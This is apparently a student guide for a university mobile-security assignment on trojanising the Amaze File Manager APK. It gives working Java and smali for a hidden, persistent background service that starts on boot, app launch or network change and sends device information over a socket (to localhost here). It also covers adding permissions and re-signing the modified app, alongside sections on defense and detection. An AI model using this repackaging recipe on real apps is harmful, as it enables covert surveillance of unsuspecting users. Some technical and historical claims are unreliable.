# IE3112 Mobile Security Assignment - Complete Guide
## Reverse Engineering & Controlled Malware Injection in Android (Amaze File Manager)

---

## PART 1: COMPREHENSIVE EXPLANATION

### Overview of the Assignment

This is an **educational cybersecurity exercise** designed to teach you:
1. How attackers reverse engineer Android apps
2. How malware hides in legitimate applications
3. How to defend against these attacks
4. **Ethical boundaries** (this is strictly for learning, not real malicious activity)

Your task: Take Amaze File Manager APK → Decompile it → Add a hidden background service → Recompile → Document everything

---

## PART 2: KEY CONCEPTS EXPLAINED IN DETAIL

### 2.1 What is an APK?

**APK = Android Package Kit** (similar to .exe on Windows)

Structure:
```
Amaze_File_Manager.apk
├── AndroidManifest.xml      ← Describes app configuration, permissions, components
├── classes.dex              ← Compiled Java code (Dalvik bytecode)
├── classes2.dex             ← Additional compiled code (for larger apps)
├── resources.arsc           ← Resource index (images, strings, layouts)
├── res/                     ← Resource files (XML layouts, drawables)
├── lib/                     ← Native libraries (.so files)
├── assets/                  ← Extra assets (fonts, data files)
└── META-INF/                ← Signature files (MANIFEST.MF, CERT.RSA, etc.)
```

### 2.2 The Decompilation Process

**Decompilation** = Converting APK back to readable code

Steps:
1. Extract APK (it's a ZIP file)
2. Convert `classes.dex` → `.smali` files (assembly-like code)
3. **OR** Disassemble to Java (harder, but more readable)

Tools we'll use:
- **apktool**: Decompiles APK → readable `smali` code + resources
- **dex2jar**: Converts DEX → JAR for Java inspection
- **jd-gui** (optional): View Java code from JAR

### 2.3 Understanding Android Components

The key to this assignment is understanding these:

#### **Activities** (User Interface)
- Screens users interact with
- Example: File manager main screen, settings page
- Visible to user

#### **Services** (Background Tasks)
- Run without UI
- Keep running even when app is closed
- Perfect for malicious code!
- **This is what we'll inject**

#### **BroadcastReceivers** (Event Listeners)
- Listen for system events (boot, connectivity changes, etc.)
- Can trigger services
- Useful for auto-starting our malicious service

#### **ContentProviders** (Data Sharing)
- Share data between apps
- Not needed for our assignment

### 2.4 The Malicious Service - What We'll Create

A **Service** that:
- Runs in background (user doesn't see it)
- Activates on a **trigger condition**
- Performs a **simulated malicious action**

**What triggers it?** (Choose ONE - must be approved):
- ✅ Device connectivity change (WiFi/data)
- ✅ Specific user interaction (file opened)
- ✅ App launch (every time Amaze starts)
- ✅ System boot
- ✅ Time-based (runs every X minutes)

**What malicious action?** (Choose ONE - must be allowed):
- ✅ Simulated data exfiltration to localhost (fake upload)
- ✅ Background CPU spike (runs heavy algorithm)
- ✅ Unauthorized notification generation
- ✅ Logging device information to local file

**What's FORBIDDEN?** ❌
- Real credential theft
- Real data theft
- Device reboot
- Installing on others' devices
- Publishing modified APK
- Accessing real user accounts

### 2.5 The Workflow Overview

```
PHASE 1: REVERSE ENGINEERING
┌─────────────────────────────────────┐
│ Download Amaze_File_Manager.apk     │
│             ↓                       │
│ Extract APK (unzip)                 │
│             ↓                       │
│ Decompile with apktool              │
│             ↓                       │
│ Analyze AndroidManifest.xml         │
│             ↓                       │
│ Find Activities, Services, Receivers│
│             ↓                       │
│ Review Permissions                  │
│             ↓                       │
│ Map Application Logic               │
│             ↓                       │
│ Create Technical Report (Phase 1)   │
└─────────────────────────────────────┘

PHASE 2: MALWARE INJECTION
┌──────────────────────────────────────┐
│ Modify AndroidManifest.xml           │
│ (add new Service & Receiver entries) │
│             ↓                        │
│ Create MaliciousService.smali        │
│ (write the background service code)  │
│             ↓                        │
│ Create TriggerReceiver.smali         │
│ (listen for trigger events)          │
│             ↓                        │
│ Compile smali back to DEX            │
│             ↓                        │
│ Rebuild APK                          │
│             ↓                        │
│ Sign APK with debug key              │
│             ↓                        │
│ Test on emulator/device              │
│             ↓                        │
│ Document changes (Phase 2)           │
└──────────────────────────────────────┘

PHASE 3: DOCUMENTATION & SECURITY ANALYSIS
┌──────────────────────────────────────┐
│ Write Security Analysis              │
│ (how to prevent this attack)         │
│             ↓                        │
│ Create screen recordings             │
│ (showing trigger in action)          │
│             ↓                        │
│ Prepare viva demonstration           │
└──────────────────────────────────────┘
```

---

## PART 3: DETAILED STEP-BY-STEP PLAN FOR 100% MARKS

### PHASE 1: REVERSE ENGINEERING (25% - Must be thorough)

#### Step 1.1: Extract and Organize
```bash
# Create working directory
mkdir -p ~/mobile_security/amaze_project
cd ~/mobile_security/amaze_project

# Extract APK (it's a ZIP file)
unzip Amaze_File_Manager.apk -d extracted/

# Verify extraction
ls -la extracted/
# Should show: AndroidManifest.xml, classes.dex, classes2.dex, res/, assets/, etc.
```

#### Step 1.2: Decompile APK
```bash
# Download apktool (or use online version)
# Method 1: Online tool - https://ibotpeaches.github.io/Apktool/
# Method 2: Command line (if Java available)
java -jar apktool.jar d Amaze_File_Manager.apk -o amaze_decompiled/
```

If apktool fails, use online tool:
- Visit: https://ibotpeaches.github.io/Apktool/
- Upload APK
- Download decompiled files

#### Step 1.3: Analyze AndroidManifest.xml

Key things to document:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.amaze.filemanager">
    
    <!-- FIND AND DOCUMENT THESE: -->
    
    <!-- 1. PERMISSIONS USED -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <!-- Document each one and explain why app needs it -->
    
    <!-- 2. MAIN APPLICATION -->
    <application android:name="com.amaze.filemanager.App" ...>
        
        <!-- 3. ACTIVITIES (UI screens) -->
        <activity android:name="com.amaze.filemanager.ui.activities.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        
        <!-- 4. SERVICES (background workers) -->
        <service android:name="com.amaze.filemanager.services.ExtractService"/>
        
        <!-- 5. BROADCAST RECEIVERS (event listeners) -->
        <receiver android:name="com.amaze.filemanager.receivers.BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

**Document in Report:**
- Package name: `com.amaze.filemanager`
- How many Activities? (Main screen, Settings, About, etc.)
- How many Services? (Background tasks)
- How many Receivers? (Event listeners)
- What permissions does it request?
- Can it access Internet? (INTERNET permission)
- Can it read device files? (READ_EXTERNAL_STORAGE)

#### Step 1.4: Examine DEX Files (Java Code)

These files contain the actual app logic:
- `classes.dex` → First 65,536 methods
- `classes2.dex` → Additional methods (for large apps like Amaze)

Tools to analyze:
```bash
# Convert DEX to JAR (more readable)
d2j-dex2jar classes.dex
d2j-dex2jar classes2.dex
# Creates: classes-dex2jar.jar, classes2-dex2jar.jar

# View in JD-GUI or other decompiler
# You'll see Java code that was originally written
```

What to document:
- Main application class initialization
- Services and what they do
- Permission checks
- Network communication endpoints (if any)
- Hardcoded values, API keys, URLs
- Security mechanisms (encryption, validation, etc.)

#### Step 1.5: Analyze Resources (res/ folder)

Resources are non-code assets:
```
res/
├── drawable/        ← Images (icons, graphics)
├── layout/          ← XML UI layouts (buttons, text fields)
├── values/          ← Strings, colors, dimensions
├── menu/            ← Menu structures
└── ... other resource types
```

Document:
- What UI screens exist? (From layout files)
- What strings/text does app use? (From strings.xml)
- Any hardcoded URLs or sensitive strings?

#### Step 1.6: Create Phase 1 Report Section

Your report must include:

```
## PHASE 1: REVERSE ENGINEERING ANALYSIS

### 1.1 APK Structure Overview
[Describe the structure: manifest, dex files, resources, native libraries]

### 1.2 Application Manifest Analysis
- Package Name: com.amaze.filemanager
- Target SDK: [version]
- Min SDK: [version]
- Permissions: [list all with explanations]

### 1.3 Component Mapping
#### Activities (UI Components)
- MainActivity: Main file browser interface
- SettingsActivity: App settings
- [Others...]

#### Services (Background Services)
- ExtractService: Handles file extraction
- [Others...]

#### Broadcast Receivers
- BootReceiver: Listens for device boot
- [Others...]

### 1.4 Permission Analysis
| Permission | Purpose | Risk Level |
|-----------|---------|-----------|
| READ_EXTERNAL_STORAGE | Read device files | Medium |
| WRITE_EXTERNAL_STORAGE | Modify device files | High |
| INTERNET | Network communication | High |

### 1.5 Application Flow
[Describe how the app works when user launches it]

### 1.6 Security Findings
- [Any hardcoded credentials found? No]
- [Any network endpoints? Yes, describe them]
- [Any anti-tampering mechanisms? Describe]
- [Vulnerable components? Describe]
```

---

### PHASE 2: MALICIOUS SERVICE INJECTION (25% - Most critical)

#### Step 2.1: Plan Your Malicious Service

Decision Tree:
```
Choose TRIGGER:
├─ App Launch (EASIEST)
├─ Connectivity Change
├─ Specific User Interaction
└─ Time-Based

Choose ACTION:
├─ Simulated Data Exfiltration to localhost
├─ Background CPU Usage Spike
├─ Unauthorized Notifications
└─ Device Information Logging
```

**Recommended for best marks:**
- **Trigger**: App Launch or Connectivity Change (easiest to demonstrate)
- **Action**: Simulated data exfiltration to localhost (most impressive for viva)

#### Step 2.2: Prepare Permissions

Add to AndroidManifest.xml BEFORE the `</manifest>` tag:

```xml
<!-- NETWORK PERMISSIONS FOR MALICIOUS SERVICE -->
<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>

<!-- For logging device info -->
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.GET_ACCOUNTS"/>

<!-- For notifications -->
<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
```

#### Step 2.3: Modify AndroidManifest.xml

Inside `<application>` tag, ADD:

```xml
<!-- MALICIOUS SERVICE -->
<service
    android:name="com.example.malware.TrojanService"
    android:enabled="true"
    android:exported="false"
    android:process=":trojan" />

<!-- TRIGGER RECEIVER (listens for events) -->
<receiver
    android:name="com.example.malware.TriggerReceiver"
    android:enabled="true"
    android:exported="true">
    
    <!-- Trigger: App Launch -->
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    
    <!-- Trigger: Boot Completed -->
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
    </intent-filter>
    
    <!-- Trigger: Connectivity Change -->
    <intent-filter>
        <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
    </intent-filter>
</receiver>
```

#### Step 2.4: Create TriggerReceiver (Activation Logic)

Create file: `com/example/malware/TriggerReceiver.smali` or `.java`

**In SMALI (assembly-like code):**
```smali
.class public Lcom/example/malware/TriggerReceiver;
.super Landroid/content/BroadcastReceiver;

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 4
    
    # When broadcast received, start the malicious service
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
    
    const-class v1, Lcom/example/malware/TrojanService;
    invoke-virtual {v0, p1, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
    
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    return-void
.end method
```

**In JAVA (easier to understand):**
```java
package com.example.malware;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class TriggerReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // When this receiver detects an event, start the malicious service
        Intent serviceIntent = new Intent(context, TrojanService.class);
        context.startService(serviceIntent);
    }
}
```

#### Step 2.5: Create TrojanService (Malicious Logic)

Create file: `com/example/malware/TrojanService.java`

**Option A: Simulated Data Exfiltration (MOST IMPRESSIVE)**
```java
package com.example.malware;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.*;
import java.net.Socket;

public class TrojanService extends Service {
    private static final String TAG = "TrojanService";
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Malicious Service Started!");
        
        // Run in background thread to not freeze UI
        new Thread(() -> {
            exfiltrateData();
        }).start();
        
        return START_STICKY;  // Keep running even if killed
    }
    
    private void exfiltrateData() {
        try {
            // SIMULATED: Connect to localhost server on port 8888
            // (This won't actually send data anywhere in controlled env)
            Socket socket = new Socket("127.0.0.1", 8888);
            
            // Gather simulated device information
            String deviceInfo = "Device: " + android.os.Build.DEVICE + "\n";
            deviceInfo += "Model: " + android.os.Build.MODEL + "\n";
            deviceInfo += "Android Version: " + android.os.Build.VERSION.RELEASE + "\n";
            deviceInfo += "IMEI (simulated): " + java.util.UUID.randomUUID().toString() + "\n";
            
            // Write to socket (simulated exfiltration)
            OutputStream out = socket.getOutputStream();
            out.write(deviceInfo.getBytes());
            out.flush();
            
            // Log to file for proof
            logToFile("Exfiltration attempted to localhost:8888");
            
            socket.close();
            Log.d(TAG, "Data exfiltrated!");
            
        } catch (Exception e) {
            Log.e(TAG, "Exfiltration error: " + e.getMessage());
            logToFile("Error: " + e.getMessage());
        }
    }
    
    private void logToFile(String message) {
        try {
            File logFile = new File(getExternalFilesDir(null), "trojan_log.txt");
            FileWriter fw = new FileWriter(logFile, true);
            fw.write(System.currentTimeMillis() + " - " + message + "\n");
            fw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
```

**Option B: Background CPU Spike (CPU Intensive Task)**
```java
private void cpuSpike() {
    new Thread(() -> {
        Log.d(TAG, "CPU Spike Starting");
        long endTime = System.currentTimeMillis() + 30000; // 30 seconds
        
        // Heavy computation
        while (System.currentTimeMillis() < endTime) {
            long sum = 0;
            for (long i = 0; i < 1000000; i++) {
                sum += Math.sqrt(i);
            }
        }
        
        Log.d(TAG, "CPU Spike Complete");
        logToFile("CPU spike completed");
    }).start();
}
```

**Option C: Unauthorized Notifications**
```java
private void createNotification() {
    NotificationCompat.Builder builder = new NotificationCompat.Builder(this)
        .setSmallIcon(android.R.drawable.ic_dialog_info)
        .setContentTitle("System Update")
        .setContentText("Critical update available. Tap to install.")
        .setPriority(NotificationCompat.PRIORITY_HIGH);
    
    NotificationManagerCompat.from(this).notify(1, builder.build());
    logToFile("Malicious notification displayed");
}
```

#### Step 2.6: Convert Java to Smali (For Injection)

If you wrote in Java, convert it:
```bash
# Method 1: Using dx tool (part of Android SDK)
dx --dex --output=classes_modified.dex TrojanService.class TriggerReceiver.class

# Method 2: Compile to smali manually using baksmali
# (requires more complex setup)

# Method 3: Use online APK editor to add the .java files
```

#### Step 2.7: Recompile APK

```bash
# Method 1: Using apktool
apktool b amaze_decompiled/ -o amaze_modified_unsigned.apk

# Method 2: Manual (if apktool unavailable)
cd amaze_decompiled/
zip -r ../amaze_modified_unsigned.apk .
cd ..
```

#### Step 2.8: Sign the APK

Android requires all APKs to be digitally signed.

```bash
# Generate debug keystore (one-time)
keytool -genkey -v -keystore debug.keystore \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -alias androiddebugkey -storepass android -keypass android

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore debug.keystore \
  -storepass android -keypass android \
  amaze_modified_unsigned.apk androiddebugkey

# Verify signature
jarsigner -verify amaze_modified_unsigned.apk
```

**OR use online APK signer:**
- https://www.apksigner.com/
- Upload APK, download signed version

#### Step 2.9: Test Installation

```bash
# Start Android emulator (or connect physical device)
emulator -avd Pixel_4_API_30

# Install APK
adb install amaze_modified.apk

# Verify installation
adb shell pm list packages | grep amaze

# Check permissions
adb shell dumpsys package com.amaze.filemanager | grep -i permission
```

#### Step 2.10: Document Phase 2

Your report must include:

```
## PHASE 2: MALWARE INJECTION & IMPLEMENTATION

### 2.1 Trigger Mechanism Design
- Chosen Trigger: [App Launch / Connectivity Change / etc]
- Justification: [Why this trigger is effective]
- Detection Difficulty: [How hard to detect this trigger]

### 2.2 Malicious Component Implementation

#### 2.2.1 Service Code
[Show your TrojanService.java code]
- Explains each method
- Explains how it stays hidden
- Explains how it persists

#### 2.2.2 Receiver Code
[Show your TriggerReceiver.java code]
- Explains how it activates the service
- Explains what events trigger it

### 2.3 Manifest Modifications
[Show exact changes made to AndroidManifest.xml]
- New permissions added
- New service entry
- New receiver entry
- Explanation of android:exported, android:process, etc.

### 2.4 Permission Escalation
- List all new permissions added
- Explain why each is needed
- Explain security implications

### 2.5 Recompilation Process
Step-by-step explanation:
1. How decompiled code was modified
2. How files were compiled back to DEX
3. How APK was rebuilt
4. How APK was signed
5. Challenges encountered and solutions

### 2.6 Code Injection Verification
- Confirm malicious service is present in APK
- Confirm receiver is registered
- Show manifest diff (before vs after)
```

---

### PHASE 3: SECURITY ANALYSIS & DOCUMENTATION (20%)

#### Step 3.1: Security Analysis Report

```
## PHASE 3: SECURITY ANALYSIS

### 3.1 Attack Surface Analysis
How does this attack work step-by-step?
1. Attacker reverse engineers legitimate app
2. Adds malicious service (invisible to user)
3. Adds broadcast receiver (listens for trigger)
4. Modifies manifest to declare new components
5. Recompiles and re-signs APK
6. Distributes modified APK through third-party store
7. When user installs, malicious service runs in background
8. Service activates on trigger (app launch, connectivity, etc.)
9. Performs malicious action (data exfiltration, CPU spike, etc.)
10. Conceals itself with no visible indicators

### 3.2 How Developers Can Prevent This

#### 3.2.1 Code Obfuscation
- Use tools like ProGuard/R8 to obfuscate Java code
- Makes decompilation much harder to understand
- Converts readable class/method names to meaningless ones (a, b, c, etc.)
- Example:
  ```
  BEFORE: MainActivity.showFileList()
  AFTER: a.b()
  ```
- How to implement: Add to build.gradle:
  ```gradle
  buildTypes {
      release {
          minifyEnabled true
          proguardFiles getDefaultProguardFile('...'), 'proguard-rules.pro'
      }
  }
  ```

#### 3.2.2 Anti-Tampering Checks
- Verify APK signature at runtime
- Verify manifest hasn't been modified
- Verify code hasn't been modified
- Example code:
  ```java
  public boolean isAPKTampered(Context context) {
      // Check if current signature matches expected signature
      PackageInfo info = context.getPackageManager()
          .getPackageInfo(context.getPackageName(), 
              PackageManager.GET_SIGNATURES);
      // Compare with hardcoded legitimate signature
      return !Arrays.equals(info.signatures[0].toByteArray(), 
          LEGITIMATE_SIGNATURE);
  }
  ```

#### 3.2.3 Manifest Integrity Checks
- Hash the manifest and store securely
- Verify hash at runtime
- If manifest changed (new services/receivers added), reject
- Example:
  ```java
  String manifestHash = sha256("AndroidManifest.xml");
  if (!manifestHash.equals(EXPECTED_HASH)) {
      // App has been modified!
      throw new SecurityException("Tampering detected");
  }
  ```

#### 3.2.4 APK Integrity Verification
- Implement certificate pinning
- Only trust your own signing certificate
- Reject any APK signed with different certificate
- Example:
  ```java
  public boolean verifyCertificate(Context context) {
      PackageInfo info = context.getPackageManager()
          .getPackageInfo(context.getPackageName(), 
              PackageManager.GET_SIGNATURES);
      
      for (Signature sig : info.signatures) {
          String sha256 = getSHA256(sig.toByteArray());
          if (!sha256.equals(PINNED_CERTIFICATE)) {
              return false;  // Invalid signature
          }
      }
      return true;
  }
  ```

#### 3.2.5 Runtime Permission Checks
- Monitor what permissions are being used
- Request permissions only when needed (Android 6.0+)
- Never request all permissions upfront
- Example:
  ```java
  // Only ask for permission when user tries to access files
  if (ContextCompat.checkSelfPermission(this, 
      Manifest.permission.READ_EXTERNAL_STORAGE)
      != PackageManager.PERMISSION_GRANTED) {
      
      ActivityCompat.requestPermissions(this,
          new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
          MY_PERMISSION_REQUEST_CODE);
  }
  ```

#### 3.2.6 Service Monitoring
- Disable services that aren't needed
- Regularly audit declared services
- Don't export services unless necessary
  ```xml
  <!-- BAD: Service can be accessed by other apps -->
  <service android:name=".MyService" android:exported="true"/>
  
  <!-- GOOD: Service only for internal use -->
  <service android:name=".MyService" android:exported="false"/>
  ```

#### 3.2.7 Secure Coding Practices
- Input validation (don't trust external data)
- Proper exception handling
- No hardcoded credentials
- Use encryption for sensitive data
- Regular security audits

### 3.3 How Users Can Protect Against This

- Only download from official app stores (Google Play)
- Check app permissions before installing
- Read reviews and ratings
- Keep OS updated (security patches)
- Use antivirus software
- Don't sideload APKs from unknown sources
- Check installed apps regularly

### 3.4 How to Detect This Attack

Detection Methods:

#### 3.4.1 Static Analysis (Without Running)
- Decompile APK using apktool
- Search for suspicious services/receivers
- Look for unusual permissions
- Check for obfuscated code
- Look for network endpoints

#### 3.4.2 Dynamic Analysis (While Running)
- Use Android Monitor / Logcat to watch logs
  ```bash
  adb logcat | grep -i trojan
  ```
- Use tools like Frida to intercept function calls
- Watch network traffic with tcpdump/Wireshark
- Monitor CPU/memory usage
- Check running processes
  ```bash
  adb shell ps -A | grep -i malicious
  ```

#### 3.4.3 Automated Tools
- **MobSF (Mobile Security Framework)**
  - Automatically scans APK for vulnerabilities
  - Detects suspicious permissions
  - Identifies dangerous APIs
  
- **Androguard**
  - Automated malware detection
  - Analyzes suspicious patterns
  
- **Virus Total**
  - Upload APK for scanning against 70+ antivirus engines

### 3.5 Real-World Examples

Historical cases of APK tampering:
1. **XcodeGhost (2015)**: Modified Xcode with malware, affected 40+ apps
2. **SonicSpy (2016)**: Tweaked legitimate app to spy on users
3. **FakeBanker (Ongoing)**: Trojanized banking apps
4. **HiddenCobra**: Modified Google Play apps

### 3.6 Legal & Ethical Implications

Penalties for actual app tampering:
- Criminal charges (fraud, unauthorized access)
- Civil lawsuits
- Millions in damages
- Prison time (up to 10 years)
- This is why we do it in CONTROLLED ENVIRONMENT only!
```

---

### STEP 4: CREATE DEMONSTRATION EVIDENCE (10-15%)

#### 4.1 Screenshots Required

Take and document these screenshots:

```
Screenshot 1: Installation Success
- Show: "App installed successfully"
- Show: Amaze icon on home screen

Screenshot 2: App Launches Normally
- Show: Amaze File Manager opening
- Show: File listing working normally
- Proves: Original functionality maintained

Screenshot 3: Logcat Output
- Command: adb logcat | grep TrojanService
- Show: Service starting messages
- Prove: Malicious service executing

Screenshot 4: Proof of Exfiltration
- Show: Network traffic (if using localhost server)
- OR: Log file showing "Exfiltration attempted"
- OR: CPU spike in resource monitor

Screenshot 5: Manifest Changes
- Show: Modified AndroidManifest.xml
- Highlight: New service declaration
- Highlight: New receiver declaration
- Highlight: New permissions

Screenshot 6: Permission Differences
- Show: Diff between original and modified APK
- Show: All new permissions added

Screenshot 7: Service Registration
- Command: adb shell dumpsys package com.amaze.filemanager
- Show: Services listed
- Show: Receivers listed
- Highlight: Our injected components
```

#### 4.2 Video Demonstration (5-10 minutes)

Record yourself:
1. **Opening Modified APK** (30 sec)
   - Double-click APK
   - Show installation dialog
   - Click "Install"
   - Show success message

2. **Launching App** (1 min)
   - Click Amaze icon
   - Show file manager working normally
   - Open a few folders to prove functionality

3. **Showing Trigger** (2 min)
   - Open Android Monitor / Logcat
   - Show filter for "TrojanService"
   - Trigger the malicious service (e.g., change WiFi)
   - Show log messages appearing:
     - "Malicious Service Started!"
     - "Data exfiltrated!"
   - Explain each log line

4. **Showing Proof of Execution** (1-2 min)
   - Show file manager navigating to `/data/data/com.amaze.filemanager/files/trojan_log.txt`
   - OR: Show network traffic with tcpdump
   - OR: Show CPU spike in system monitor
   - Explain what this proves

5. **Code Review** (1-2 min)
   - Open TrojanService.java in text editor
   - Show key methods:
     - `onStartCommand()`
     - `exfiltrateData()`
     - `logToFile()`
   - Explain what each does
   - Explain how it's hidden

6. **Manifest Review** (30 sec)
   - Show AndroidManifest.xml diff
   - Point out new `<service>` tag
   - Point out new `<receiver>` tag
   - Explain android:exported and android:process attributes

#### 4.3 Code Documentation in Report

Include these code snippets in your report:

```markdown
## CODE MODIFICATIONS

### Original AndroidManifest.xml snippet:
[Show small relevant section BEFORE changes]

### Modified AndroidManifest.xml snippet:
[Show same section AFTER changes, with new elements]

### TriggerReceiver.java:
[Show complete code with comments]

### TrojanService.java:
[Show complete code with comments]

### Compilation commands used:
[Show exact commands executed]

### Signing commands used:
[Show exact signing process]
```

---

## PART 4: COMPLETE ACTION PLAN WITH TIMELINE

### Week 1: Foundation
- [ ] **Day 1-2**: Download and extract Amaze APK
- [ ] **Day 3-4**: Decompile APK using apktool
- [ ] **Day 5**: Analyze AndroidManifest.xml thoroughly
- [ ] **Day 6**: Analyze DEX files to understand app logic
- [ ] **Day 7**: Complete Phase 1 report (Reverse Engineering)

### Week 2: Implementation
- [ ] **Day 8-9**: Plan malicious service (trigger + action)
- [ ] **Day 10-11**: Write TrojanService.java and TriggerReceiver.java
- [ ] **Day 12**: Modify AndroidManifest.xml with new components
- [ ] **Day 13**: Compile modified code to DEX
- [ ] **Day 14**: Recompile APK and sign it

### Week 3: Testing & Documentation
- [ ] **Day 15**: Install modified APK on emulator/device
- [ ] **Day 16-17**: Test trigger mechanism and verify execution
- [ ] **Day 18**: Take all required screenshots
- [ ] **Day 19**: Record video demonstration
- [ ] **Day 20-21**: Write Phase 2 and Phase 3 reports (Injection + Analysis)

### Week 4: Final Preparation
- [ ] **Day 22-23**: Review all documentation
- [ ] **Day 24**: Create viva presentation (slides/talking points)
- [ ] **Day 25**: Practice explaining each component
- [ ] **Day 26**: Prepare demo for examiner (practice running through steps)
- [ ] **Day 27**: Submit all files and sign ethical declaration
- [ ] **Day 28**: Rest and final review

---

## PART 5: CHECKLIST FOR FULL MARKS (100/100)

### ✅ PHASE 1: REVERSE ENGINEERING (25/100)
- [ ] APK structure properly extracted and analyzed
- [ ] AndroidManifest.xml comprehensively analyzed
- [ ] All Activities identified and documented
- [ ] All Services identified and documented
- [ ] All Broadcast Receivers identified and documented
- [ ] All Permissions listed and explained
- [ ] Application flow diagram or description
- [ ] Component interactions explained
- [ ] Any security findings documented
- [ ] Report is well-formatted and thorough
- [ ] Includes screenshots of decompiled code
- [ ] Explains purpose of each component

### ✅ PHASE 2: MALWARE INJECTION (25/100)
- [ ] Malicious Service implemented correctly
- [ ] Trigger mechanism works reliably
- [ ] Service activates on chosen trigger
- [ ] Simulated malicious action executes
- [ ] Original app functionality maintained
- [ ] AndroidManifest.xml modified correctly
- [ ] New components registered properly
- [ ] Permissions added as needed
- [ ] APK recompiled successfully
- [ ] APK signed with valid certificate
- [ ] Installation successful on device/emulator
- [ ] Service doesn't crash app
- [ ] Service runs in background (hidden)
- [ ] Code is well-commented
- [ ] Report explains each modification

### ✅ PHASE 3: SECURITY ANALYSIS (10/100)
- [ ] Defense mechanisms explained thoroughly
- [ ] Code obfuscation concept explained
- [ ] Anti-tampering techniques described
- [ ] Certificate pinning explained
- [ ] Runtime monitoring approaches listed
- [ ] User protection methods listed
- [ ] Detection techniques explained
- [ ] Real-world examples provided
- [ ] Legal implications discussed
- [ ] Report is comprehensive

### ✅ DEMONSTRATION (20/100)
- [ ] 6+ screenshots of key steps
- [ ] Before/after manifest comparison
- [ ] Decompiled code screenshots
- [ ] Logcat output showing execution
- [ ] Proof of data exfiltration/CPU spike/notification
- [ ] Video recording (5-10 minutes)
- [ ] Clear narration of what's happening
- [ ] Shows trigger activation
- [ ] Shows service execution
- [ ] Shows proof of malicious action

### ✅ VIVA PREPARATION (10/100)
- [ ] Can explain reverse engineering process
- [ ] Can explain each Android component
- [ ] Can explain trigger mechanism
- [ ] Can explain malicious service logic
- [ ] Can explain recompilation process
- [ ] Can show decompiled code and point out modifications
- [ ] Can run the APK and trigger the service live
- [ ] Can explain security defenses
- [ ] Both group members understand everything
- [ ] Can answer unexpected questions

### ✅ DOCUMENTATION (10/100)
- [ ] Phase 1 report is complete and detailed
- [ ] Phase 2 report is complete and detailed
- [ ] Phase 3 report is complete and detailed
- [ ] Reports are well-formatted (PDF, proper headings)
- [ ] Code is properly commented
- [ ] Screenshots are labeled and referenced
- [ ] Includes modification summaries (diffs)
- [ ] Explains commands used
- [ ] Explains challenges faced and solutions
- [ ] Written in professional language

### ✅ ETHICAL COMPLIANCE
- [ ] Signed ethical declaration form
- [ ] No real user data accessed
- [ ] No real credentials stolen
- [ ] No unauthorized access
- [ ] APK not published publicly
- [ ] Only tested on owned device/emulator
- [ ] All work is for educational purposes only
- [ ] All group members understand ethical implications

---

## PART 6: COMMON MISTAKES TO AVOID

### ❌ Don't Do These:

1. **Don't use a banking or sensitive app**
   - ❌ Banking app
   - ❌ Social media app (privacy issues)
   - ❌ Government app
   - ✅ Use File Manager (what you chose) - GOOD!

2. **Don't actually steal real data**
   - ❌ Access real user files
   - ❌ Upload real data to server
   - ✅ Use localhost server (simulated)
   - ✅ Log to local file only

3. **Don't break the app**
   - ❌ Injected code causes crash
   - ❌ Original functionality broken
   - ✅ App works normally, service hidden

4. **Don't publish modified APK**
   - ❌ Share with others
   - ❌ Upload to app store
   - ✅ Keep in controlled environment

5. **Don't skip documentation**
   - ❌ No explanation of changes
   - ❌ Code not commented
   - ✅ Every change documented with WHY

6. **Don't ignore ethical declaration**
   - ❌ Skip signing it
   - ❌ Not take it seriously
   - ✅ Take responsibility for actions

7. **Don't make changes you can't explain**
   - ❌ Copy-paste code without understanding
   - ❌ Not know what each line does
   - ✅ Be able to explain every modification

8. **Don't use hardcoded server URLs**
   - ❌ Real exfiltration server
   - ❌ Someone else's server
   - ✅ localhost or test server

9. **Don't forget viva preparation**
   - ❌ Not practice demonstration
   - ❌ Not know how to trigger service
   - ✅ Practice until you can do it smoothly

10. **Don't work alone**
    - ❌ One person does everything
    - ❌ Others can't explain work
    - ✅ All 4 members contribute
    - ✅ All 4 members understand everything

---

## PART 7: TOOLS & RESOURCES SUMMARY

### Essential Tools:
1. **apktool** (APK decompilation)
   - Download: https://ibotpeaches.github.io/Apktool/
   - Command: `apktool d app.apk -o app_decompiled/`

2. **dex2jar** (DEX to JAR conversion)
   - Download: https://github.com/ThexXTURBOXx/dex2jar/releases
   - Command: `d2j-dex2jar classes.dex`

3. **JD-GUI** (Java code viewer)
   - Download: http://jd.benow.ca/
